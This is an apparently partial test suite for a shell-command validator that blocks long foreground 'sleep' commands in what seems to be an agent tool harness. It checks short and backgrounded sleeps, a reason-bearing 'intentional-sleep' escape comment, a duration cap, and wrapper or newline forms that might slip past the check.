  it('allows sleep durations below 2 seconds', () => {
    expect(detectBlockedSleepPattern('sleep 0.5')).toBeNull();
    expect(detectBlockedSleepPattern('sleep 1.5')).toBeNull();
    expect(detectBlockedSleepPattern('sleep 1500ms')).toBeNull();
  });

  it('allows sleep not as first subcommand', () => {
    expect(detectBlockedSleepPattern('echo hello && sleep 5')).toBeNull();
  });

  it('allows non-sleep commands', () => {
    expect(detectBlockedSleepPattern('cat file.txt')).toBeNull();
    expect(detectBlockedSleepPattern('npm run dev')).toBeNull();
  });

  it('allows sleep in pipelines', () => {
    expect(detectBlockedSleepPattern('sleep 5 | cat')).toBeNull();
    expect(
      detectBlockedSleepPattern(
        'sleep 10 | while read line; do echo $line; done',
      ),
    ).toBeNull();
  });

  it('allows backgrounded sleep (bare &)', () => {
    expect(detectBlockedSleepPattern('sleep 5 & echo done')).toBeNull();
    expect(detectBlockedSleepPattern('sleep 10 & wait')).toBeNull();
  });

  it('returns null for empty command', () => {
    expect(detectBlockedSleepPattern('')).toBeNull();
  });

  it('blocks sleep followed by a top-level shell comment', () => {
    // Shell ignores trailing comments, so these are equivalent to
    // standalone foreground sleeps unless they use the explicit
    // intentional-sleep escape hatch.
    expect(detectBlockedSleepPattern('sleep 5 # wait')).toBe(
      'standalone sleep 5',
    );
    expect(detectBlockedSleepPattern('sleep 5  #wait')).toBe(
      'standalone sleep 5',
    );
    expect(detectBlockedSleepPattern('sleep 2s   # comment')).toBe(
      'standalone sleep 2s',
    );
    expect(detectBlockedSleepPattern('sleep 5 && echo ok # trailing')).toBe(
      'sleep 5 followed by: echo ok',
    );
  });

  it('allows standalone sleep with an intentional sleep comment', () => {
    expect(
      detectBlockedSleepPattern(
        'sleep 5 # intentional-sleep: wait for MCP rate limit reset',
      ),
    ).toBeNull();
    expect(
      detectBlockedSleepPattern(
        'sleep 2s # intentional-sleep: deliberate rate limit backoff',
      ),
    ).toBeNull();
    expect(
      detectBlockedSleepPattern(
        'sleep 10m # intentional-sleep: wait for MCP rate limit reset',
      ),
    ).toBeNull();
  });

  it('requires a meaningful intentional sleep reason', () => {
    expect(detectBlockedSleepPattern('sleep 5 # intentional-sleep:')).toBe(
      'standalone sleep 5',
    );
    expect(detectBlockedSleepPattern('sleep 5 # intentional-sleep: wait')).toBe(
      'standalone sleep 5',
    );
    expect(
      detectBlockedSleepPattern('sleep 5 # intentional-sleep: 1234567'),
    ).toBe('standalone sleep 5');
    expect(
      detectBlockedSleepPattern('sleep 5 # intentional-sleep: 12345678'),
    ).toBeNull();
  });

  it('blocks intentional sleep comments above the duration cap', () => {
    expect(
      detectBlockedSleepPattern(
        'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
      ),
    ).toBe('standalone sleep 601s');
  });

  it('does not allow intentional sleep comments on leading sleep chains', () => {
    expect(
      detectBlockedSleepPattern(
        'sleep 5 && echo ok # intentional-sleep: wait for rate limit reset',
      ),
    ).toBe('sleep 5 followed by: echo ok');
  });

  it('does not allow intentional sleep comments to hide newline commands', () => {
    expect(
      detectBlockedSleepPattern(
        'sleep 5 # intentional-sleep: wait for rate limit reset\necho ok',
      ),
    ).toBe('sleep 5 followed by: echo ok');
  });

  it('preserves commands after a shell comment newline', () => {
    expect(detectBlockedSleepPattern('sleep 5 # wait\necho ok')).toBe(
      'sleep 5 followed by: echo ok',
    );
  });

  it('does not treat in-quoted `#` as a comment', () => {
    // `#` inside single quotes is literal, so the suffix is not a comment
    // and the existing separator logic still rejects it.
    expect(
      detectBlockedSleepPattern("sleep 5 'arg # not a comment'"),
    ).toBeNull();
  });

  it('blocks wrapped foreground sleep when paired with stripShellWrapper', () => {
    // This mirrors the shell validator call site: the foreground sleep
    // guard runs on `stripShellWrapper(params.command)`, so `bash -c` and
    // sibling wrappers cannot route around the block by hiding the sleep
    // inside a `-c` script.
    expect(
      detectBlockedSleepPattern(stripShellWrapper("bash -c 'sleep 5'")),
    ).toBe('standalone sleep 5');
    expect(
      detectBlockedSleepPattern(stripShellWrapper("sh -c 'sleep 10'")),
    ).toBe('standalone sleep 10');
    expect(
      detectBlockedSleepPattern(stripShellWrapper("zsh -c 'sleep 2s'")),
    ).toBe('standalone sleep 2s');
    expect(
      detectBlockedSleepPattern(
        stripShellWrapper("bash -c 'sleep 5 && curl http://localhost'"),
      ),
    ).toBe('sleep 5 followed by: curl http://localhost');

    // A wrapped sleep < 2s is still allowed.
    expect(
      detectBlockedSleepPattern(stripShellWrapper("bash -c 'sleep 1'")),
    ).toBeNull();
  });
});
